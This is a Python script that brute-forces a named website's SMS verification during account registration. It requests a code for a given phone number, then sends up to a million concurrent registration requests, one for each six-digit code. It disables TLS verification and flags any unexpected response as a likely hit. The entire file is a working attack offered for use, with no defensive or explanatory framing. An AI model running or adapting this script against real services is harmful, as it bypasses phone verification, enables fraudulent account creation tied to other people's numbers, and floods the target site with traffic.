import asyncio, httpx, json, random, sys, time, re
BASE="https://ofa1777.ofa377.net/api"
H={"Content-Type":"application/json","Origin":"https://ofa1777.ofa377.net","Referer":"https://ofa1777.ofa377.net/"}
async def main():
    P=sys.argv[1] if len(sys.argv)>1 else "886911111222"
    limit=int(sys.argv[2]) if len(sys.argv)>2 else 1000000
    start=int(sys.argv[3]) if len(sys.argv)>3 else 0
    async with httpx.AsyncClient(verify=False,timeout=20,limits=httpx.Limits(max_connections=128, max_keepalive_connections=128)) as c:
        r=await c.post(BASE+"/v2/sms/send",data=json.dumps({"phone_number":P}),headers=H)
        print("sms:",r.status_code,r.text[:80],flush=True)
        t0=time.time(); done=0
        non4405={}
        sem=asyncio.Semaphore(80)
        async def one(code):
            nonlocal done
            async with sem:
                d={"bank_account":"123","bank_code":"CMB","bank_currency":"TWD","bank_name":"Test",
                   "email":"t%d@example.com"%random.randint(1,10**9),"line":"l%d"%random.randint(1,999),
                   "name":"Test","password":"Passw0rd!123","phone_number":P,"refer_code":"",
                   "username":"bf%d"%random.randint(10**6,10**7),"verify_code":code}
                try:
                    rr=await c.post(BASE+"/v2/register/",data=json.dumps(d),headers=H)
                    b=rr.json()
                except Exception as e:
                    return
                done+=1
                ec=b.get("code"); ecod=b.get("error_code")
                if ec not in (200,422) or ecod!="4405":
                    non4405[(rr.status_code,ec,ecod)]=non4405.get((rr.status_code,ec,ecod),0)+1
                    print("HIT?",rr.status_code,json.dumps(b)[:400],flush=True)
        codes=[str(x).zfill(6) for x in range(start,start+limit)]
        random.shuffle(codes)
        tasks=[asyncio.create_task(one(cd)) for cd in codes]
        # progress
        for t in asyncio.as_completed(tasks):
            await t
            if done and done%50000==0:
                print("done",done,"elapsed %.1fs"%(time.time()-t0),"non4405",dict(list(non4405.items())[:6]),flush=True)
        print("TOTAL",done,"non4405",non4405,"elapsed %.1fs"%(time.time()-t0),flush=True)
asyncio.run(main())
